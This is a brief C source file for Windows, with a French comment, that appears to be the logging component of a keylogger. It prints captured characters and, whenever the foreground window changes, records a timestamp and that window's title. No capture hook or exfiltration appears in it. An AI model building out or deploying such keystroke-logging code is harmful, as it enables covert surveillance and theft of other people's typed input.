#include "header.h"

HWND window = NULL;
WCHAR window_name[120]; // vérifier un de ces 4 si ça marche ne local

void edit_log(short character)
{
	if (window == GetForegroundWindow())
		printf("%c", character);
	else
	{
		window_title();
		printf("%c", character);
	}
}

void window_title(void)
{
	SYSTEMTIME time;

	//put_file();
	GetSystemTime(&time);
	printf("\n\n# [ %d / %d / %d ]\n# %d:%d\n",	time.wDay, time.wMonth, time.wYear,
											time.wHour, time.wMinute);
	window = GetForegroundWindow();
	GetWindowText(window, window_name, 100);
	wprintf(L"-------- %s -------\n", window_name);
}
